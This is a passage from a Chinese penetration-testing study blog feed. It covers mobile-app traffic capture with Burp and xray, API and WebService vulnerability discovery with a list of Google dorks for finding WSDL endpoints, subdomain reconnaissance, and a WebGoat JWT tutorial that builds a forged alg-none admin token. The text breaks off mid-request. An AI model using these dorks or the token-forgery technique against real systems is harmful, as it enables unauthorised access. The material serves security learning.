抓包，其他协议抓包演示及说明</strong></li><li><strong>未逆向层面进行抓包区分各协议测试</strong></li><li><strong>逆向层面进行提取 APK 代码层面数据</strong></li><li>参考： <a href="https://www.cnblogs.com/L0ading/p/12388928.html">https://www.cnblogs.com/L0ading/p/12388928.html</a></li></ol><blockquote><p>所以渗透主要是：对URL进行抓取，对URL进行协议分类，然后分别进行攻击。可以使用web类攻击，也可以使用其他。</p></blockquote><h2 id="url提取"><a class="markdownIt-Anchor" href="#url提取"></a> URL提取</h2><h3 id="burp"><a class="markdownIt-Anchor" href="#burp"></a> Burp</h3><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230608214941671.png" alt="image-20230608214941671" /></p><p>然后搜索一下（showall）关键字，像id之类的。</p><p>需要注意的是：</p><blockquote><p>由于这些app的链接都能在 <strong>电脑</strong> 上访问，但是访问之后的**请求数据包不一样！**所以，你需要在测试的时候先抓一个安卓数据包，然后在测试的时候（例如xray）改一下http头部。</p><p>如果你不用burp，可以在手机端安装：<strong>抓包精灵</strong>。跟burp的抓包功能差不多。但是功能不好用，不是什么数据都抓。</p></blockquote><h3 id="apk-analyser"><a class="markdownIt-Anchor" href="#apk-analyser"></a> Apk Analyser</h3><p>直接把APK放进去扫就行。</p><h3 id="xrayawvsburp联动扫描"><a class="markdownIt-Anchor" href="#xrayawvsburp联动扫描"></a> xray/awvs+burp联动扫描</h3><p>设置如下：</p><ol><li><p>手机端的wifi模块高级设置，设置代理转发到192.168.???.???的端口8888</p></li><li><p>burp设置代理捕获端口8888，然后设置转发端口6666</p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230609093308523.png" alt="image-20230609093308523" style="zoom:80%;" /></li><li><p>xray设置代理端口为6666，开启webscan：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\xray.exe webscan --listen 127.0.0.1:6666</span><br></pre></td></tr></table></figure></li><li><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230609093858920.png" alt="image-20230609093858920" style="zoom:67%;" /></li></ol><h2 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h2><p>上工具/自己按照web的方法使用</p><h1 id="api接口服务漏洞发现"><a class="markdownIt-Anchor" href="#api接口服务漏洞发现"></a> API接口服务漏洞发现</h1><p>API接口渗透测试是通过用渗透测试的方法测试系统组件间接口的一种测试。<strong>接口渗透测试主要用于检测外部系统与系统之间以及内部各个子系统之间的交互点</strong>。测试的重点是要<strong>检查数据的交换，传递和控制管理过程，以及系统间的相互逻辑依赖关系等</strong>。</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/20210515173719.png" alt="img" /></p><p>参考：</p><ol><li><a href="https://blog.csdn.net/dzqxwzoe/article/details/129221428">https://blog.csdn.net/dzqxwzoe/article/details/129221428</a></li><li><a href="https://xz.aliyun.com/t/2412">https://xz.aliyun.com/t/2412</a></li><li><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/03.%E6%80%9D%E8%B7%AF%E6%8A%80%E5%B7%A7/03.api%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95#%E6%8E%A5%E5%8F%A3%E6%96%87%E6%A1%A3%E7%9A%84%E4%BD%9C%E7%94%A8">https://blog.gm7.org/个人知识库/01.渗透测试/03.思路技巧/03.api接口测试#接口文档的作用</a></li></ol><h2 id="漏洞挖掘关注点"><a class="markdownIt-Anchor" href="#漏洞挖掘关注点"></a> 漏洞挖掘关注点</h2><h3 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h3><p>在 API 渗透中，<strong>除了常规的域名、端口、服务器 banner 之类的信息外</strong>，API 本身所特有的信息在信息收集时需要关注。举例如下。</p><ul><li><strong>API 是否存在接口定义规范描述文件</strong>？【判断接口类型】如果存在，遵循的规范是什么？SOAP、Open API 2.0、Open API 3.0 还是 Graph QL？</li></ul><ul><li>API 是依赖什么语言实现的？Java、.NET、PHP、Python、Go 还是其他语言？【构造payload需要用到】</li><li>API 运行所依赖的组件是什么版本，是否存在已知漏洞？</li><li>互联网上是否存在其泄露的 API Key 或证书？</li><li>API 是否存在多个版本？多个接入端？</li></ul><p>还有就是，需要提供两个信息：【最重要】</p><ol><li><strong>API地址</strong></li><li><strong>接口文档</strong></li><li><strong>其他的按需要求客户提供，比如接口示例、认证token、sign校验算法等</strong></li></ol><h3 id="手工测试"><a class="markdownIt-Anchor" href="#手工测试"></a> 手工测试</h3><p>在 API 渗透测试中，手工挖掘往往占有较大的比重。当采用手工挖掘时，以下事项是需要重点关注的。</p><ul><li><p><strong>认证和授权</strong>：对于 API 的认证鉴权机制，设计人员和研发人员往往认识不足，有的 API 调用甚至缺少认证与授权机制。比如令牌、HTTP 方法（GET，POST，PUT 和 DELETE 等）在进入服务器之前是否都经过了验证，OAuth 协议使用的正确性，无认证和授权的 API 是否可以任意调用。</p></li><li><p><strong>输入验证</strong>：和其他类型的应用程序一样，对于输入的不可信是应用程序安全的基础，但研发人员常常因疏忽导致对输入缺少有效的验证。比如 XML 实体注入类型的攻击、不同的响应类型 application/json 与 application/xml。</p></li><li><p><strong>数据编码</strong>：包含 JSON 格式的数据，容易导致反序列化漏洞或远程代码执行。</p></li><li><p><strong>API 版本和影子 API</strong>：同一个 API 的不同版本或未在 API 规范文件中描述的 API，更容易发现安全漏洞。</p></li></ul><h2 id="测试接口类型"><a class="markdownIt-Anchor" href="#测试接口类型"></a> 测试接口类型：</h2><ol><li><strong>Webservice接口</strong>：走soap协议，请求报文和返回报文都是<strong>xml</strong>格式</li><li><strong>HTTP API接口</strong>（常规客户）：走HTTP协议，通过路径来区分调用的方法，以<strong>RESTful</strong>风格为主，请求报文入参有多种形式，返回报文一般为<strong>json</strong>串，最常见的是get和post方法</li></ol><p>接口测试分为web service和API接口测试,WebSocket接口等测试。可以使用该网址进行发包啥的：<a href="https://v7.apipost.cn/apis#/apis/run">https://v7.apipost.cn/apis#/apis/run</a></p><h3 id="webservice"><a class="markdownIt-Anchor" href="#webservice"></a> WebService</h3><p>Web Service服务也是一些包装过的接口而已，针对Web Service服务的渗透测试和对常规API渗透测试是一样的、只是，可以使用安全工具来辅助进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WebScarap</span><br><span class="line">SoapUI</span><br><span class="line">WCFStorm</span><br><span class="line">SOA Cleaner</span><br><span class="line">WSDigger</span><br><span class="line">wsScanner</span><br><span class="line">Wfuzz</span><br><span class="line">RESTClient</span><br><span class="line">BurpSuite</span><br><span class="line">WS-Attacker</span><br><span class="line">ZAP</span><br><span class="line">Metasploit</span><br><span class="line">WSDL Analyze</span><br></pre></td></tr></table></figure><p>SoapUI NG Pro作为Web Service的测试工具，Burp作为代理、监听SoapUI NG Pro用自己构造的payload报文打Web Service的流量报文，其中可以篡改对应的报文参数实现渗透测试。</p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230612134657810.png" alt="image-20230612134657810" style="zoom: 67%;" /><p>可以查找：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">inurl:jws?wsdl</span><br><span class="line">inurl:asmx?wsdl</span><br><span class="line">inurl:aspx?wsdl</span><br><span class="line">inurl:ascx?wsdl</span><br><span class="line">inurl:ashx?wsdl</span><br><span class="line">inurl:dll?wsdl</span><br><span class="line">inurl:exe?wsdl</span><br><span class="line">inurl:php?wsdl</span><br><span class="line">inurl:pl?wsdl</span><br><span class="line">inurl:?wsdl</span><br><span class="line">filetype:jws</span><br><span class="line">filetype:asmx</span><br><span class="line">filetype:ascx</span><br><span class="line">filetype:aspx</span><br><span class="line">filetype:ashx</span><br><span class="line">filetype:dll</span><br><span class="line">filetype:exe</span><br><span class="line">filetype:php</span><br><span class="line">filetype:pl</span><br><span class="line">filetype:wsdl</span><br></pre></td></tr></table></figure><h2 id="测试手法"><a class="markdownIt-Anchor" href="#测试手法"></a> 测试手法</h2><p>在得到api之后，有这个思路可以参考挖掘：</p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230612143924759.png" alt="image-20230612143924759" style="zoom: 67%;" /><ol><li>观察接口命名，采用驼峰命名法，是否存在其他不在接口文档的类似的测试接口，比如<code>getUserInfos</code>、<code>getUserInfoByUid</code>等</li><li>这个地方虽然参数是<code>phone</code>，那会不会后端模糊查询输入用户名也可以查询呢</li><li>查询任意用户信息的接口，应该存在鉴权机制<ol><li>未授权访问</li><li>针对普通用户，每个人只能查询自己的信息</li></ol></li><li>手机号进入后端查询用户的信息，肯定会进行数据库查询<ol><li>是否可以模糊查询，比如<code>1388888%</code></li><li>是否存在SQL注入</li><li>参数置空、过长或者输入特殊字符，会不会导致数据库报错抛出异常，获取一些敏感信息</li></ol></li></ol><h1 id="补充知识点信息的最大化"><a class="markdownIt-Anchor" href="#补充知识点信息的最大化"></a> 补充知识点（信息的最大化）</h1><p>前置知识：使用IP访问和使用域名访问有什么区别？</p><blockquote><p>假设：有域名abc.com对应域名123.123.123.123，其建立的文件夹目录为：<code>d:\www\j3fffff\</code></p><ul><li>使用域名访问则会访问目录：<code>d:\www\j3fffff\</code></li><li>使用IP访问则会访问目录：<code>d:\www\</code></li></ul><p>所以如果有文件：<code>d:\www\old.zip</code>，那么使用IP地址可以访问，而使用域名就不行。</p></blockquote><h2 id="ip-端口-web"><a class="markdownIt-Anchor" href="#ip-端口-web"></a> IP  端口 web</h2><p>在如BurpSuite这种代理工具中设定的过滤规则来筛选Web Service请求。比如“.dll?wsdl”、“.ashx?wsdl”、“.exe?wsdl”、“.php?wsdl”等</p><h2 id="域名-web"><a class="markdownIt-Anchor" href="#域名-web"></a> 域名 web</h2><p>子域名搜集，搜集的站点越多，目标越多，机会越多，可能越多！</p><p>子域名搜集不仅仅局限于（子域名挖掘机）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.jmlsd.com</span><br><span class="line">bbs.jmlsd.com</span><br><span class="line">old.jmlsd.com</span><br></pre></td></tr></table></figure><p>还可以 <strong>换后缀</strong> 看他以前有没有注册过这些域名（可以去<a href="https://www.west.cn/services/domain/%E7%9C%8B%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89%E8%A2%AB%E6%B3%A8%E5%86%8C%EF%BC%89%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%EF%BC%8C%E9%82%A3%E4%B9%88%E5%8F%AF%E8%83%BD%E6%98%AF%E5%90%8C%E4%B8%80%E5%AE%B6%E7%9A%84%EF%BC%8C**%E5%B9%B6%E4%B8%94%E6%8C%82%E8%BD%BD%E4%BA%86%E8%80%81%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%88%96%E8%80%85%E5%85%B6%E4%BB%96%E4%B8%9A%E5%8A%A1**%EF%BC%88%E5%8F%AF%E8%83%BD%E6%98%AF%E6%9C%89%E6%BC%8F%E6%B4%9E%E7%9A%84%EF%BC%89%EF%BC%9A">https://www.west.cn/services/domain/看看有没有被注册），如果有，那么可能是同一家的，**并且挂载了老的系统或者其他业务**（可能是有漏洞的）：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www.jmlsd.com.cn</span><br><span class="line">www.jmlsd.cn</span><br><span class="line">www.jmlsd.net</span><br><span class="line">www.jmlsd.org</span><br></pre></td></tr></table></figure><p><strong>还可以通过注册人反查他注册了什么公司</strong></p><p>还可以通过特有信息，例如网站上写着：键美乐 ，那就查这个，可能会有其他域名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.jmljy.com.cn</span><br></pre></td></tr></table></figure><p>这个跟上面的是不一样的，他是“家园”，而不是“时代”。但是是一家公司的！</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230609152636845.png" alt="image-20230609152636845" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;为什么要做漏洞发现？如果知道漏洞，就不用进行很多攻击，直接利用exp&lt;/li&gt;
&lt;li&gt;漏洞类型&amp;amp;危害条件？知道危害条件就可</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="漏洞发现" scheme="https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>JAVA常见漏洞与代码审计基础</title>
    <link href="https://j3f5.github.io/articles/2023/06/08/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/06/08/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</id>
    <published>2023-06-08T05:50:18.000Z</published>
    <updated>2023-06-08T05:50:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>这一篇很长，鉴于之前已经分享过的漏洞内容，这里做一个Java漏洞的合集，里面的很多漏洞均已在之前的文章分析过，这里着重讲发现漏洞的trick，如何去操作，原理是怎么样的。进而，我们可以知道如何去审计一个系统。</p><p>这里已经默认安装了很多工具，不再一一讲。</p><p>此篇章将融合webgoat的代码审计、安全狗《JAVA代码审计（入门篇）》以及奇安信《网络安全：Java代码审计实战》整理而出。</p><h1 id="注入漏洞类"><a class="markdownIt-Anchor" href="#注入漏洞类"></a> 注入漏洞类</h1><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;p&gt;这一篇很长，鉴于之前已经分享过的漏洞内容，这里做一个Java漏洞的合集，里面的很多漏洞均已在之前的文章分析过，这里着重讲发现漏洞的trick，如</summary>
      
    
    
    
    <category term="JAVA安全基础" scheme="https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="审计技巧" scheme="https://j3f5.github.io/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>JWT安全</title>
    <link href="https://j3f5.github.io/articles/2023/06/07/JWT%E5%AE%89%E5%85%A8/"/>
    <id>https://j3f5.github.io/articles/2023/06/07/JWT%E5%AE%89%E5%85%A8/</id>
    <published>2023-06-07T06:14:47.000Z</published>
    <updated>2023-06-08T06:14:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jwt概念"><a class="markdownIt-Anchor" href="#jwt概念"></a> JWT概念</h1><p>JSON Web Token（简称 JWT）是目前最流行的<strong>跨域认证</strong>解决方案。是一种<strong>认证授权机制</strong>。</p><img src="/images/JWT%E5%AE%89%E5%85%A8/JWT%E5%AE%89%E5%85%A8.png" alt="JWT安全" style="zoom:80%;" /><h2 id="组成部分"><a class="markdownIt-Anchor" href="#组成部分"></a> 组成部分</h2><p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607154004007.png" alt="image-20230607154004007" /></p><p>上面是使用base64编码的。头部和声明 部分都由JSON对象表示。头部 描述了应用于JWT的加密操作，以及JWT的附加属性，可以选择。声明代表一个JSON对象，其成员是JWT所传达的声明。</p><p>我们可以使用这个工具来解密：<a href="https://jwt.io/">https://jwt.io/</a></p><h3 id="头部-header"><a class="markdownIt-Anchor" href="#头部-header"></a> 头部 Header</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;alg&quot;:&quot;HS256&quot;,</span><br><span class="line">&quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>alg</strong></p><blockquote><p>是说明这个JWT 的签名使用的算法的参数，常见值用HS256（默认），HS512 等，也可以为None。HS256表示 HMAC SHA256。</p></blockquote><p><strong>typ</strong></p><blockquote><p>说明这个 token 的类型为 JWT</p></blockquote><h3 id="声明-claims"><a class="markdownIt-Anchor" href="#声明-claims"></a> 声明 Claims</h3><p>令牌包含识别用户的要求，以及服务器满足请求所需的所有其他信息。请注意不要在令牌中存储敏感信息，并始终通过安全通道发送。例如解码得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;exp&quot;: 1416471934,</span><br><span class="line">&quot;user_name&quot;: &quot;user&quot;,</span><br><span class="line">&quot;scope&quot;: [</span><br><span class="line">&quot;read&quot;,</span><br><span class="line">&quot;write&quot;</span><br><span class="line">],</span><br><span class="line">&quot;authorities&quot;: [</span><br><span class="line">&quot;ROLE_ADMIN&quot;,</span><br><span class="line">&quot;ROLE_USER&quot;</span><br><span class="line">],</span><br><span class="line">&quot;jti&quot;: &quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;,</span><br><span class="line">&quot;client_id&quot;: &quot;my-client-with-secret&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>JWT 固定参数有：</strong></p><ul><li>iss：发行人</li><li>exp：到期时间</li><li>sub：主题</li><li>aud：用户</li><li>nbf：在此之前不可用</li><li>iat：发布时间</li><li>jti：JWT ID 用于标识该 JWT</li></ul><h3 id="签名-signature"><a class="markdownIt-Anchor" href="#签名-signature"></a> 签名 Signature</h3><p>每个JWT令牌在发送给客户端之前至少应该被<strong>签名</strong>，如果一个令牌没有被签名，客户端应用程序将能够改变令牌的内容。签名规范在这里定义，你可以使用的具体算法在这里描述。基本上，你使用</p><ul><li>HMAC与SHA-2函数</li><li>数字签名与RSASSA-PKCS1-v1_5/ECDSA/RSASSA-PSS 函数</li></ul><p>来签名令牌。在执行任何其他操作之前验证签名是一个重要的步骤。<strong>【需要密钥！】</strong></p><h2 id="认证与获取jwt令牌"><a class="markdownIt-Anchor" href="#认证与获取jwt令牌"></a> 认证与获取JWT令牌</h2><p><img src="/images/JWT%E5%AE%89%E5%85%A8/jwt_diagram.png" alt="jwt diagram" /></p><p>在这个流程中，你可以看到</p><ol><li>用户用一个用户名和密码登录，认证成功后，服务器会返回。</li><li>服务器创建一个新的令牌并将这个令牌返回给客户端。</li><li>当客户端连续调用服务器时，它在 &quot;授权 &quot;头中附加了新的令牌。</li><li>服务器读取令牌并首先验证签名，验证成功后，服务器使用令牌中的信息来识别用户。</li></ol><h2 id="分类访问access令牌与刷新refresh令牌"><a class="markdownIt-Anchor" href="#分类访问access令牌与刷新refresh令牌"></a> 分类访问(Access)令牌与刷新(Refresh)令牌</h2><p>通常有两种类型的令牌：访问令牌和刷新令牌。访问令牌用于对服务器进行 API 调用。访问令牌的生命周期有限，这就是刷新令牌的用武之地。一旦访问令牌不再有效，就可以向服务器发出请求，以通过出示刷新令牌来获取新的访问令牌。刷新令牌可以过期，但它们的寿命要长得多。</p><p>这解决了用户必须使用其凭据再次进行身份验证的问题。您是否应该使用刷新令牌和访问令牌取决于以下几点，在选择要使用的令牌时要牢记以下几点。</p><ol><li><p>登录获取令牌：<code>curl -X POST -H -d 'username=webgoat&amp;password=webgoat' localhost:8080/WebGoat/login</code></p></li><li><p>服务器返回令牌：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;token_type&quot;:&quot;bearer&quot;,</span><br><span class="line">    &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;,</span><br><span class="line">    &quot;expires_in&quot;:10,</span><br><span class="line">    &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如您所见，<strong>刷新令牌是一个随机字符串</strong>，服务器可以对其进行跟踪（在内存中或存储在数据库中），<strong>以便将刷新令牌与授予刷新令牌的用户相匹配</strong>。因此，在这种情况下，只要访问令牌仍然有效，我们就可以说是“无状态”会话，服务器端设置用户会话没有负担，令牌是自包含的。当访问令牌不再有效时，<strong>服务器需要查询存储的刷新令牌以确保令牌未以任何方式被阻止</strong>。</p></li><li><p><strong>每当攻击者获得访问令牌时，它仅在一定时间内有效（比如 10 分钟）</strong>。然后攻击者需要刷新令牌来获取新的访问令牌。这就是刷新令牌需要更好保护的原因。也可以使刷新令牌无状态，但这意味着将更难查看用户是否撤销了令牌。服务器完成所有验证后，它必须向客户端返回一个新的刷新令牌和一个新的访问令牌。客户端可以使用新的访问令牌进行 API 调用。</p></li></ol><p>无论选择哪种解决方案，您都应该在服务器端存储足够的信息以验证用户是否仍然可信。</p><ul><li><strong>存储 ip 地址</strong></li><li><strong>跟踪使用刷新令牌的次数</strong>（在访问令牌的有效时间窗口内多次使用刷新令牌可能表示奇怪的行为，你可以撤销所有令牌并让用户再次进行身份验证）</li><li><strong>跟踪哪个访问令牌属于哪个刷新令牌</strong>，否则攻击者可能能够使用攻击者的刷新令牌为不同的用户获取新的访问令牌（参见 <a href="https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/">https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/</a> 以获得关于此攻击如何工作的精彩文章）</li><li><strong>检查用户的 IP 地址或地理位置</strong>。如果您需要发出新的令牌，请检查位置是否仍然相同，如果不撤销所有令牌并让用户再次进行身份验证。</li></ul><h2 id="jwt的用处"><a class="markdownIt-Anchor" href="#jwt的用处"></a> JWT的用处</h2><p>在现代单页应用程序 (SPA) 中使用刷新令牌是否有意义？正如我们在关于存储令牌的部分中看到的那样，有两种选择：</p><ul><li>Web 存储</li><li>cookie</li></ul><p>这意味着刷新令牌就在访问令牌旁边，因此如果访问令牌泄露，刷新令牌也可能会受到损害。大多数时候当然是有区别的。</p><p>访问令牌在您进行 API 调用时发送，<strong>刷新令牌仅在应获取新访问令牌时发送</strong>，这在大多数情况下是不同的端点。如果您最终在同一台服务器上，您可以选择仅使用访问令牌。</p><p>如上所述，使用访问令牌和单独的刷新令牌为服务器提供了一些杠杆，而不是一遍又一遍地检查访问令牌。仅在用户需要新的访问令牌时执行检查。当然可以只使用访问令牌。在服务器上，您存储的信息与您为刷新令牌存储的信息完全相同，请参阅上一段。这样您每次都需要检查令牌，但这可能适用于不同的应用程序。在存储刷新令牌以进行验证的情况下，保护这些令牌也很重要（至少使用哈希函数将它们存储在数据库中）。</p><p>有很多可用资源质疑使用 JWT 令牌进行客户端到服务器身份验证的用例。<strong>使用 JWT 令牌的最佳位置是服务器到服务器之间的通信</strong>。在普通的 Web 应用程序中，您最好使用普通的旧 cookie。</p><img src="/images/JWT%E5%AE%89%E5%85%A8/jwt-flowchart.png" alt="img" style="zoom:80%;" /><h1 id="伪造签名令牌"><a class="markdownIt-Anchor" href="#伪造签名令牌"></a> 伪造签名令牌</h1><h2 id="伪造access_token攻击"><a class="markdownIt-Anchor" href="#伪造access_token攻击"></a> 伪造access_token攻击</h2><p>截获数据包，发现</p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607161353947.png" alt="image-20230607161353947" style="zoom:67%;" /><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607161318132.png" alt="image-20230607161318132" style="zoom:67%;" /><p>发现里面有个字段为：admin=false，改成true试试看。但是返回一个：token不正确，要检查。所以可能是签名出问题了，我们改了参数值，同步的签名也要进行更改的，但是我们没有密钥，所以后面的签名没办法更改。我们可以尝试更改头部，让它不用密钥加密就好啦，直接 none 走起！操作如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;none&quot;&#125;</span><br><span class="line">eyJhbGciOiJub25lIn0=</span><br><span class="line">&#123;&quot;iat&quot;:1686989890,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;&#125;</span><br><span class="line">eyJpYXQiOjE2ODY5ODk4OTAsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==</span><br></pre></td></tr></table></figure><p>但是在HTTP数据传输的过程中，Base64编码中的<code>=+/</code>等特殊的符号通过URL容易产生歧义，所以产生了与URL兼容的Base64 URL编码，所以把<code>=</code>删掉，就构造好了：<code>eyJhbGciOiJub25lIn0.eyJpYXQiOjE2ODY5ODk4OTAsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.</code></p><img src="/images/JWT%E5%AE%89%E5%85%A8/image-20230607165148603.png" alt="image-20230607165148603" style="zoom:50%;" /><h2 id="伪造authorization"><a class="markdownIt-Anchor" href="#伪造authorization"></a> 伪造authorization</h2><p>这个的伪造点在字段：Authorization中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /WebGoat/JWT/refresh/checkout HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Content-Length: 0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;112&quot;, &quot;Google Chrome&quot;;v=&quot;112&quot;, 